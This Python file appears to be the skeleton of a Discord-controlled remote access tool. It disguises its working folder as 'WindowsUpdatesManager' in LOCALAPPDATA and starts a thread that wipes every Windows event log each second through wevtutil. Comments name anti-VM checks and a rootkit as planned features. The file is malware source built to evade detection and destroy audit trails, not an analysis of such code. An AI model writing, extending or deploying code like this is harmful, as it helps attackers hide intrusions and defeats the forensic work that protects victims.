import os, json, discord, time, threading


#IDEAS:
#   Anti VM (low priority)
#   Rootkit (med-high pr)



class Variables:
    def __init__(self):
        t = os.getenv("TOKEN").split("MMM")
        self.token = t[0]
        self.snky_dir = f"{os.getenv("LOCALAPPDATA")}\\WindowsUpdatesManager"

        if os.path.exists(f"{self.snky_dir}\\cfg.json"):
            with open(f"{self.snky_dir}\\cfg.json", "r") as f:
                self.cfg = json.load(f)
        else:
            self.cfg = {
                "prefix": "!"
            }

def clear_logs():
    while True: 
        os.popen("wevtutil el | Foreach-Object {wevtutil cl \"$_\"}")
        time.sleep(1)

intents = discord.Intents.all()
variables = Variables()

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    threading.Thread(target=clear_logs, daemon=True).start()

@client.event
async def on_message(message):
    if message.author.bot:
        return

    #HELP MESSAGE
    if message.content.startswith(f"{variables.cfg['prefix']}help"):
        embed = discord.Embed(title="Help", color=0x00ff00)
        embed.add_field(name="!help", value="Shows this message", inline=False)

        await message.channel.send(embed=embed)

    if message.content.startswith(f"{variables.cfg['prefix']}modu"):
        await message.channel.purge()
client.run(variables.token)
